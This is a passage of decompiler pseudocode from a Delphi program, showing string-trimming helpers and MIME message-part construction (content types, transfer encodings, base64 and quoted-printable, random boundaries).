  char *v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v9 = a2;
  v10 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v9);
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_41136E;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v4 = __linkproc__ LStrPos(v9, v10);
  if ( v4 >= 1 )
  {
    __linkproc__ LStrCopy(v10, 1, v4 - 1, &v8);
    Sysutils::Trim(v8, a3);
  }
  else
  {
    Sysutils::Trim(v10, a3);
  }
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_411375;
  System::__linkproc__ LStrArrayClr(v5, 3);
}

//----- (0041137C) --------------------------------------------------------
void __usercall sub_41137C(char *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  int v4; // ebx
  int v5; // eax
  LStr *v6; // ecx
  unsigned int v7[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v8; // [esp-4h] [ebp-18h]
  char *v9; // [esp+8h] [ebp-Ch] BYREF
  int v10; // [esp+Ch] [ebp-8h]
  char *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v10 = a2;
  v11 = a1;
  sub_4038D8((int)a1);
  sub_4038D8(v10);
  v8 = (LStr *)&savedregs;
  v7[1] = (unsigned int)&loc_4113FC;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v4 = __linkproc__ LStrPos(v10, v11);
  v5 = sub_403724((int)v11);
  __linkproc__ LStrCopy(v11, v4 + 1, v5 - v4, &v9);
  Sysutils::Trim(v9, a3);
  v6 = v8;
  __writefsdword(0, v7[0]);
  v8 = (LStr *)&loc_411403;
  System::__linkproc__ LStrArrayClr(v6, 3);
}

//----- (0041140C) --------------------------------------------------------
void __usercall sub_41140C(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>)
{
  LStr *v4; // ecx
  unsigned int v5[2]; // [esp-10h] [ebp-1Ch] BYREF
  LStr *v6; // [esp-8h] [ebp-14h]
  int v7; // [esp-4h] [ebp-10h]
  char *v8; // [esp+0h] [ebp-Ch] BYREF
  char *v9; // [esp+4h] [ebp-8h] BYREF
  char *v10; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = 0;
  v8 = 0;
  v7 = a3;
  v10 = a1;
  sub_4038D8((int)a1);
  v6 = (LStr *)&savedregs;
  v5[1] = (unsigned int)&loc_411481;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_41137C(v10, (int)dword_411498, &v9);
  sub_4112E4(v9, (int)&dword_4114A4, &v8);
  __linkproc__ LStrLAsg(&v9, v8);
  Sysutils::Trim(v9, a2);
  v4 = v6;
  __writefsdword(0, v5[0]);
  v6 = (LStr *)&loc_411488;
  System::__linkproc__ LStrArrayClr(v4, 3);
}
// 41140C: could not find valid save-restore pair for ebx
// 411498: using guessed type int dword_411498[3];
// 4114A4: using guessed type int dword_4114A4;

//----- (004114A8) --------------------------------------------------------
void __usercall sub_4114A8(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>)
{
  char *v4; // ecx
  char v5; // zf
  char *v6; // ecx
  char *v7; // ecx
  LStr *v8; // ecx
  LStr *v9; // ecx
  unsigned int v10[2]; // [esp-10h] [ebp-24h] BYREF
  LStr *v11; // [esp-8h] [ebp-1Ch]
  int v12; // [esp-4h] [ebp-18h]
  char *v13; // [esp+0h] [ebp-14h] BYREF
  char *v14; // [esp+4h] [ebp-10h] BYREF
  char *v15; // [esp+8h] [ebp-Ch] BYREF
  char *v16; // [esp+Ch] [ebp-8h] BYREF
  char *v17; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = a3;
  v17 = a1;
  sub_4038D8((int)a1);
  v11 = (LStr *)&savedregs;
  v10[1] = (unsigned int)&loc_4115A2;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  Sysutils::Trim(v17, &v15);
  __linkproc__ LStrLAsg(&v17, v15);
  sub_41137C(v17, (int)dword_4115B8, &v16);
  System::__linkproc__ LStrCmp(v4, v17);
  if ( v5 )
  {
    sub_41137C(v17, (int)dword_4115C4, &v16);
    System::__linkproc__ LStrCmp(v6, v17);
    if ( v5 )
    {
      sub_4112E4(v17, (int)&dword_4115DC, &v16);
      System::__linkproc__ LStrCmp(v7, v17);
      if ( v5 )
        System::__linkproc__ LStrClr(v8);
    }
    else
    {
      sub_4112E4(v16, (int)dword_4115D0, &v13);
      __linkproc__ LStrLAsg(&v16, v13);
    }
  }
  else
  {
    sub_4112E4(v16, (int)dword_4115B8, &v14);
    __linkproc__ LStrLAsg(&v16, v14);
  }
  Sysutils::Trim(v16, a2);
  v9 = v11;
  __writefsdword(0, v10[0]);
  v11 = (LStr *)&loc_4115A9;
  System::__linkproc__ LStrArrayClr(v9, 5);
}
// 4114A8: could not find valid save-restore pair for ebx
// 4114FA: variable 'v4' is possibly undefined
// 4114FF: variable 'v5' is possibly undefined
// 411534: variable 'v6' is possibly undefined
// 41156E: variable 'v7' is possibly undefined
// 411578: variable 'v8' is possibly undefined
// 4115B8: using guessed type int dword_4115B8[3];
// 4115C4: using guessed type int dword_4115C4[3];
// 4115D0: using guessed type int dword_4115D0[3];
// 4115DC: using guessed type int dword_4115DC;

//----- (004115E0) --------------------------------------------------------
int Idcookie::Finalization()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_411631;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E664 )
  {
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41D73C, (char *)dword_401004, 12);
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41D720, (char *)dword_401004, 7);
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41D720: using guessed type int (*off_41D720)[21];
// 41D73C: using guessed type int (*off_41D73C)[34];
// 41E664: using guessed type int dword_41E664;

//----- (0041163C) --------------------------------------------------------
void sub_41163C()
{
  --dword_41E664;
}
// 41E664: using guessed type int dword_41E664;

//----- (00411838) --------------------------------------------------------
_DWORD *__usercall sub_411838@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  char v7; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)System::__linkproc__ ClassCreate((int)a1, a2, v7);
  v2 = a2;
  v3 = a1;
  TObject_Create(a1);
  TObject_Create(&off_40BBB4);
  v3[9] = v4;
  TObject_Create(&off_40BE60);
  v3[10] = v5;
  *((_BYTE *)v3 + 19) = sub_40EEAC();
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 411841: variable 'v7' is possibly undefined
// 411846: variable 'a2' is possibly undefined
// 41185F: variable 'v4' is possibly undefined
// 41186E: variable 'v5' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 40BE60: using guessed type _DWORD (__fastcall *off_40BE60)(Classes::TMemoryStream *__hidden this, int);

//----- (00411894) --------------------------------------------------------
_DWORD *__usercall sub_411894@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_402D3C(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_402BDC((_DWORD *)v2[10]);
  sub_402BDC((_DWORD *)v5[9]);
  result = sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    result = (_DWORD *)sub_402D2C(v5);
  return result;
}
// 41189B: variable 'v3' is possibly undefined

//----- (004118CC) --------------------------------------------------------
void __usercall sub_4118CC(int a1@<eax>)
{
  _DWORD *v2; // eax
  char v3; // al
  bool v4; // cf
  unsigned __int8 v5; // al
  char v6; // al
  LStr *v7; // ecx
  int v8; // edi
  int v9; // esi
  int v10; // esi
  LStr *v11; // ecx
  int v12; // eax
  int v13; // esi
  char v14; // al
  char v15; // al
  char v16; // al
  char v17; // al
  char v18; // al
  char v19; // al
  char v20; // al
  char v21; // al
  char v22; // al
  char v23; // al
  char v24; // al
  LStr *v25; // ecx
  LStr *v26; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v27; // [esp-Ch] [ebp-4Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v28; // [esp-8h] [ebp-48h] BYREF
  int *v29; // [esp-4h] [ebp-44h]
  LStr *v30; // [esp+0h] [ebp-40h]
  BYTE *v31; // [esp+Ch] [ebp-34h] BYREF
  char *v32; // [esp+10h] [ebp-30h] BYREF
  BYTE *v33; // [esp+14h] [ebp-2Ch] BYREF
  BYTE *v34; // [esp+18h] [ebp-28h] BYREF
  BYTE *v35; // [esp+1Ch] [ebp-24h] BYREF
  BYTE *v36; // [esp+20h] [ebp-20h] BYREF
  BYTE *v37; // [esp+24h] [ebp-1Ch] BYREF
  BYTE *v38; // [esp+28h] [ebp-18h] BYREF
  BYTE *v39; // [esp+2Ch] [ebp-14h] BYREF
  int v40; // [esp+30h] [ebp-10h]
  BYTE *v41; // [esp+34h] [ebp-Ch] BYREF
  char *v42; // [esp+38h] [ebp-8h] BYREF
  _DWORD *v43; // [esp+3Ch] [ebp-4h]
  int savedregs; // [esp+40h] [ebp+0h] BYREF

  v29 = &savedregs;
  v28 = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_411CD8;
  v27 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v27);
  TObject_Create(&off_40BBB4);
  v43 = v2;
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, LStr *))(**(_DWORD **)(a1 + 36) + 64))(
    v27,
    v28,
    v29,
    v30);
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 40) + 12))(0, 0);
  v30 = (LStr *)&savedregs;
  v29 = (int *)&loc_411CA9;
  v28 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v28);
  v3 = *(_BYTE *)(a1 + 16);
  v4 = v3 == 0;
  v5 = v3 - 1;
  if ( v4 )
    goto LABEL_6;
  v4 = v5 < 2u;
  v6 = v5 - 2;
  if ( v4 )
  {
    (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, LStr *))(**(_DWORD **)(a1 + 36) + 92))(
      v28,
      v29,
      v30);
    goto LABEL_23;
  }
  if ( !v6 )
  {
LABEL_6:
    if ( *(_BYTE *)(a1 + 17) == 3 )
    {
      while ( 1 )
      {
        v10 = sub_40D830(*(_DWORD *)(a1 + 40));
        if ( v10 >= Classes::TStream::GetSize(*(_DWORD *)(a1 + 40)) )
          break;
        System::__linkproc__ LStrSetLength(&v41, 54, v11);
        System::__linkproc__ LStrClr(v7);
        v8 = (*(int (__fastcall **)(int, BYTE *, struct _EXCEPTION_REGISTRATION_RECORD *, int *, LStr *))(**(_DWORD **)(a1 + 40) + 4))(
               54,
               v41,
               v28,
               v29,
               v30);
        v9 = v8;
        if ( v8 > 0 )
        {
          v40 = 1;
          do
          {
            sub_403670(&v39);
            System::__linkproc__ LStrCat((BYTE **)&v42, (char *)v39);
            ++v40;
            --v9;
          }
          while ( v9 );
        }
        if ( !*(_BYTE *)(a1 + 16) )
        {
          sub_40EDA4((int)v42, *(_BYTE *)(a1 + 19), *(_BYTE *)(a1 + 18), &v38);
          __linkproc__ LStrLAsg(&v42, (char *)v38);
        }
        sub_40F4CC((int)v42, &v37);
        __linkproc__ LStrLAsg(&v42, (char *)v37);
        if ( v8 != 54 )
          System::__linkproc__ LStrCat((BYTE **)&v42, (char *)dword_411CF0);
        (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
      }
    }
    else
    {
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int *, LStr *))(*v43 + 92))(v28, v29, v30);
      v12 = (*(int (**)(void))(*v43 + 20))();
      if ( v12 - 1 >= 0 )
      {
        v13 = v12;
        v40 = 0;
        do
        {
          (*(void (__fastcall **)(char **, int))(*v43 + 12))(&v42, v40);
          if ( !*(_BYTE *)(a1 + 16) )
          {
            sub_40EDA4((int)v42, *(_BYTE *)(a1 + 19), *(_BYTE *)(a1 + 18), &v36);
            __linkproc__ LStrLAsg(&v42, (char *)v36);
          }
          sub_40F3B4((int)v42, &v35);
          __linkproc__ LStrLAsg(&v42, (char *)v35);
          (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
          ++v40;
          --v13;
        }
        while ( v13 );
      }
    }
  }
LABEL_23:
  (*(void (**)(void))(**(_DWORD **)(a1 + 36) + 52))();
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(0, 0);
  if ( !*(_DWORD *)(a1 + 20) )
  {
    v14 = *(_BYTE *)(a1 + 16);
    v4 = v14 == 0;
    v15 = v14 - 1;
    if ( v4 )
    {
      __linkproc__ LStrAsg((char **)(a1 + 20), "plain");
    }
    else if ( v15 )
    {
      v16 = v15 - 1;
      if ( v16 )
      {
        if ( v16 == 1 )
          __linkproc__ LStrAsg((char **)(a1 + 20), "octet-stream");
      }
      else
      {
        __linkproc__ LStrAsg((char **)(a1 + 20), "rfc822");
      }
    }
    else
    {
      __linkproc__ LStrAsg((char **)(a1 + 20), "mixed");
    }
  }
  if ( *(_DWORD *)(a1 + 24) )
  {
    System::__linkproc__ LStrCat3(&v34, (BYTE *)"Content-Disposition: ", *(char **)(a1 + 24));
    (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v34, 0);
  }
  v17 = *(_BYTE *)(a1 + 17);
  v4 = v17 == 0;
  v18 = v17 - 1;
  if ( v4 )
  {
    __linkproc__ LStrLAsg(&v42, "7bit");
  }
  else if ( v18 )
  {
    v19 = v18 - 1;
    if ( v19 )
    {
      if ( v19 == 1 )
        __linkproc__ LStrLAsg(&v42, "base64");
    }
    else
    {
      __linkproc__ LStrLAsg(&v42, "quoted-printable");
    }
  }
  else
  {
    __linkproc__ LStrLAsg(&v42, "8bit");
  }
  v20 = *(_BYTE *)(a1 + 16);
  v4 = v20 == 0;
  v21 = v20 - 1;
  if ( v4 || v21 == 2 )
  {
    System::__linkproc__ LStrCat3(&v33, (BYTE *)"Content-Transfer-Encoding: ", v42);
    (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v33, 0);
  }
  v22 = *(_BYTE *)(a1 + 16);
  v4 = v22 == 0;
  v23 = v22 - 1;
  if ( v4 )
  {
    v27 = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
    sub_40EF00(*(_BYTE *)(a1 + 18), &v32);
    System::__linkproc__ LStrCatN(&v42, 5);
  }
  else
  {
    if ( !v23 )
      goto LABEL_57;
    v24 = v23 - 1;
    if ( v24 )
    {
      if ( v24 != 1 )
        goto LABEL_58;
      if ( !__linkproc__ LStrPos((char)dword_411E18, *(char **)(a1 + 32)) )
      {
        v27 = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
        System::__linkproc__ LStrCatN(&v42, 5);
        goto LABEL_58;
      }
LABEL_57:
      v27 = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
      System::__linkproc__ LStrCatN(&v42, 6);
      goto LABEL_58;
    }
    v27 = *(struct _EXCEPTION_REGISTRATION_RECORD **)(a1 + 4);
    System::__linkproc__ LStrCatN(&v42, 4);
  }
LABEL_58:
  System::__linkproc__ LStrCat3(&v31, (BYTE *)"Content-Type: ", v42);
  (*(void (__fastcall **)(BYTE *, _DWORD))(**(_DWORD **)(a1 + 36) + 84))(v31, 0);
  __writefsdword(0, (unsigned int)v28);
  v30 = (LStr *)&loc_411CB0;
  sub_402BDC(v43);
  v25 = v30;
  __writefsdword(0, (unsigned int)v28);
  v30 = (LStr *)&loc_411CDF;
  System::__linkproc__ LStrArrayClr(v25, 9);
  System::__linkproc__ LStrArrayClr(v26, 2);
}
// 4118FB: variable 'v2' is possibly undefined
// 411959: variable 'v11' is possibly undefined
// 411961: variable 'v7' is possibly undefined
// 411CD2: variable 'v26' is possibly undefined
// 40BBB4: using guessed type void *off_40BBB4;
// 411CF0: using guessed type int dword_411CF0[3];
// 411E18: using guessed type int dword_411E18[3];

//----- (00411E58) --------------------------------------------------------
void __usercall sub_411E58(int a1@<eax>, char *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  LStr *v6; // ecx
  char *v7; // ecx
  int v8; // edi
  int (**v9)[21]; // ebx
  char v10; // zf
  LStr *v11; // ecx
  unsigned int v12[2]; // [esp-18h] [ebp-24h] BYREF
  LStr *v13; // [esp-10h] [ebp-1Ch]
  int v14; // [esp-Ch] [ebp-18h]
  int v15; // [esp-8h] [ebp-14h]
  int v16; // [esp-4h] [ebp-10h]
  char *v17; // [esp+0h] [ebp-Ch] BYREF
  BYTE *v18; // [esp+4h] [ebp-8h] BYREF
  char *v19; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v16 = a3;
  v15 = a5;
  v14 = a4;
  v19 = a2;
  sub_4038D8((int)a2);
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_411F2F;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_411F70(a1, 0);
  System::__linkproc__ LStrClr(v6);
  sub_41137C(v19, (int)dword_411F48, &v17);
  Sysutils::UpperCase((int)v17, &v18);
  if ( !v18 )
    Sysutils::UpperCase((int)v19, &v18);
  v8 = 16;
  v9 = &off_41D76C;
  while ( 1 )
  {
    System::__linkproc__ LStrCmp(v7, (char *)v18);
    if ( v10 )
      break;
    v9 += 3;
    if ( !--v8 )
      goto LABEL_7;
  }
  sub_411F70(a1, (char *)v9[1]);
  __linkproc__ LStrAsg((char **)(a1 + 20), (char *)v9[2]);
LABEL_7:
  if ( !*(_DWORD *)(a1 + 4) )
    sub_411F70(a1, "application");
  if ( !*(_DWORD *)(a1 + 20) )
    __linkproc__ LStrAsg((char **)(a1 + 20), "mixed");
  v11 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_411F36;
  System::__linkproc__ LStrArrayClr(v11, 3);
}
// 411E58: could not find valid save-restore pair for ebx
// 411E58: could not find valid save-restore pair for edi
// 411E58: could not find valid save-restore pair for esi
// 411E8B: variable 'v6' is possibly undefined
// 411ECB: variable 'v7' is possibly undefined
// 411ED0: variable 'v10' is possibly undefined
// 411F48: using guessed type int dword_411F48[3];
// 41D76C: using guessed type int (*off_41D76C)[21];

//----- (00411F70) --------------------------------------------------------
void __usercall sub_411F70(int a1@<eax>, char *a2@<edx>)
{
  LStr *v3; // ecx
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  LStr *v5; // [esp-4h] [ebp-10h]
  BYTE *v6; // [esp+4h] [ebp-8h] BYREF
  char *v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = 0;
  v7 = a2;
  sub_4038D8((int)a2);
  v5 = (LStr *)&savedregs;
  v4[1] = (unsigned int)&loc_412008;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  __linkproc__ LStrAsg((char **)(a1 + 4), v7);
  Sysutils::UpperCase((int)v7, &v6);
  *(_BYTE *)(a1 + 16) = 3;
  if ( __linkproc__ LStrPos((char)"TEXT", (char *)v6) == 1 )
    *(_BYTE *)(a1 + 16) = 0;
  if ( __linkproc__ LStrPos((char)"MULTIPART", (char *)v6) == 1 )
    *(_BYTE *)(a1 + 16) = 1;
  if ( __linkproc__ LStrPos((char)"MESSAGE", (char *)v6) == 1 )
    *(_BYTE *)(a1 + 16) = 2;
  v3 = v5;
  __writefsdword(0, v4[0]);
  v5 = (LStr *)&loc_41200F;
  System::__linkproc__ LStrArrayClr(v3, 2);
}

//----- (00412048) --------------------------------------------------------
void __userpurge sub_412048(int a1@<eax>, char a2@<dl>, char a3@<cl>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, char **a7)
{
  LStr *v8; // ecx
  int v9; // esi
  int v10; // edi
  LStr *v11; // ecx
  LStr *v12; // ecx
  _DWORD v13[6]; // [esp-18h] [ebp-34h] BYREF
  char *v14; // [esp+0h] [ebp-1Ch] BYREF
  BYTE *v15; // [esp+4h] [ebp-18h] BYREF
  BYTE *v16; // [esp+8h] [ebp-14h] BYREF
  BYTE *v17; // [esp+Ch] [ebp-10h] BYREF
  char *v18; // [esp+10h] [ebp-Ch] BYREF
  unsigned int v19; // [esp+14h] [ebp-8h]
  int v20; // [esp+18h] [ebp-4h]
  LStr *savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13[5] = a4;
  v13[4] = a6;
  v13[3] = a5;
  HIBYTE(v19) = a3;
  v20 = a1;
  sub_4038D8(a1);
  v13[2] = &savedregs;
  v13[1] = &loc_412143;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_40EDA4(v20, a2, SHIBYTE(v19), (BYTE **)&v18);
  sub_40F3B4((int)v18, &v16);
  __linkproc__ LStrLAsg(&v18, (char *)v16);
  System::__linkproc__ LStrClr(v8);
  v9 = sub_403724((int)v18);
  if ( v9 > 0 )
  {
    v10 = 1;
    do
    {
      if ( v18[v10 - 1] == 32 )
      {
        System::__linkproc__ LStrCat(&v17, (char *)dword_41215C);
      }
      else
      {
        sub_403670(&v15);
        System::__linkproc__ LStrCat(&v17, (char *)v15);
      }
      ++v10;
      --v9;
    }
    while ( v9 );
  }
  sub_40EF00(SHIBYTE(v19), &v14);
  System::__linkproc__ LStrCatN(a7, 5);
  v11 = savedregs;
  __writefsdword(0, v19);
  savedregs = (LStr *)&loc_41214A;
  System::__linkproc__ LStrArrayClr(v11, 5);
  System::__linkproc__ LStrClr(v12);
}
// 412048: could not find valid save-restore pair for ebx
// 412048: could not find valid save-restore pair for edi
// 412048: could not find valid save-restore pair for esi
// 4120A4: variable 'v8' is possibly undefined
// 41213D: variable 'v12' is possibly undefined
// 41215C: using guessed type int dword_41215C[3];

//----- (00412184) --------------------------------------------------------
int __usercall sub_412184@<eax>(int a1@<eax>)
{
  int v1; // ebx
  int v2; // edi
  int v3; // esi
  LStr *v4; // ecx
  unsigned int v6[2]; // [esp-Ch] [ebp-3Ch] BYREF
  LStr *v7; // [esp-4h] [ebp-34h]
  signed __int32 v8[8]; // [esp+Ch] [ebp-24h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v9 = a1;
  sub_4038D8(a1);
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_41220E;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v1 = 0;
  v2 = sub_403724(v9);
  if ( v2 > 0 )
  {
    v3 = 1;
    while ( 1 )
    {
      qmemcpy(v8, dword_412220, sizeof(v8));
      sub_402A44(v8, (char *)off_41DBFC, 32);
      if ( _bittest(v8, *(unsigned __int8 *)(v9 + v3 - 1)) )
        break;
      ++v3;
      if ( !--v2 )
        goto LABEL_6;
    }
    LOBYTE(v1) = 1;
  }
LABEL_6:
  v4 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_412215;
  System::__linkproc__ LStrClr(v4);
  return v1;
}
// 412220: using guessed type int dword_412220[4];
// 41DBFC: using guessed type void *off_41DBFC;

//----- (00412240) --------------------------------------------------------
void __usercall sub_412240(char *a1@<eax>, char **a2@<edx>, int a3@<edi>)
{
  char v4; // al
  int v5; // eax
  int v6; // ebx
  char v7; // al
  LStr *v8; // ecx
  unsigned int v9[2]; // [esp-Ch] [ebp-18h] BYREF
  LStr *v10; // [esp-4h] [ebp-10h]
  char *v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = a1;
  sub_4038D8((int)a1);
  v10 = (LStr *)&savedregs;
  v9[1] = (unsigned int)&loc_4122B8;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( (unsigned __int8)sub_412184((int)v11) )
  {
    v4 = sub_40EEAC();
    LOBYTE(v5) = sub_40F230((int)v11, v4, 1023);
    v6 = v5;
    v7 = sub_40EEAC();
    sub_412048((int)v11, v7, v6, v6, a3, (int)a2, a2);
  }
  else
  {
    __linkproc__ LStrAsg(a2, v11);
  }
  v8 = v10;
  __writefsdword(0, v9[0]);
  v10 = (LStr *)&loc_4122BF;
  System::__linkproc__ LStrClr(v8);
}
// 412282: variable 'v5' is possibly undefined

//----- (004122C8) --------------------------------------------------------
void __usercall sub_4122C8(char *a1@<eax>, char **a2@<edx>, int a3@<ebx>, int a4@<edi>)
{
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-10h] [ebp-20h] BYREF
  LStr *v7; // [esp-8h] [ebp-18h]
  int v8; // [esp-4h] [ebp-14h]
  char *v9; // [esp+0h] [ebp-10h] BYREF
  char *v10; // [esp+4h] [ebp-Ch] BYREF
  char *v11; // [esp+8h] [ebp-8h] BYREF
  char *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v9 = 0;
  v8 = a3;
  v12 = a1;
  sub_4038D8((int)a1);
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_41235C;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_4114A8(v12, &v11, (int)a2);
  sub_41140C(v12, &v10, (int)a2);
  if ( v11 )
  {
    sub_412240(v11, &v9, a4);
    System::__linkproc__ LStrCatN(a2, 5);
  }
  else
  {
    __linkproc__ LStrAsg(a2, v10);
  }
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_412363;
  System::__linkproc__ LStrArrayClr(v5, 4);
}
// 4122C8: could not find valid save-restore pair for ebx

//----- (0041238C) --------------------------------------------------------
void __usercall sub_41238C(char **a1@<eax>)
{
  int v2; // eax
  LStr *v3; // ecx
  _DWORD v4[5]; // [esp-14h] [ebp-18h] BYREF
  int v5; // [esp+0h] [ebp-4h] BYREF
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v5 = 0;
  v4[2] = &savedregs;
  v4[1] = &loc_4123F2;
  v4[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  Randomize();
  v2 = sub_4028F4(0x7FFFFFFFu);
  Sysutils::IntToHex((int)&v5, 8, v2);
  System::__linkproc__ LStrCatN(a1, 3);
  v3 = savedregs;
  __writefsdword(0, v4[4]);
  savedregs = (LStr *)&loc_4123F9;
  System::__linkproc__ LStrClr(v3);
}

//----- (0041243C) --------------------------------------------------------
int sub_41243C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_412478;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_41E668 )
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41D76C, (char *)dword_401004, 48);
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41D76C: using guessed type int (*off_41D76C)[21];
// 41E668: using guessed type int dword_41E668;

//----- (00412484) --------------------------------------------------------
void sub_412484()
{
  --dword_41E668;
}
// 41E668: using guessed type int dword_41E668;

//----- (00412560) --------------------------------------------------------
_DWORD *__usercall sub_412560@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  char v8; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)System::__linkproc__ ClassCreate((int)a1, a2, v8);
  v2 = a2;
  v3 = a1;
  TObject_Create(a1);
  TObject_Create(&off_40B908);
  v3[1] = v4;
  TObject_Create(&off_40BBB4);
  v3[2] = v5;
  TObject_Create(&off_40BBB4);
  v3[4] = v6;
  if ( v2 )
    sub_402D34(v3);
  return v3;
}
// 412569: variable 'v8' is possibly undefined
// 41256E: variable 'a2' is possibly undefined
// 412587: variable 'v4' is possibly undefined
// 412596: variable 'v5' is possibly undefined
// 4125A5: variable 'v6' is possibly undefined
// 40B908: using guessed type void *off_40B908;
// 40BBB4: using guessed type void *off_40BBB4;

//----- (004125C4) --------------------------------------------------------
_DWORD *__usercall sub_4125C4@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
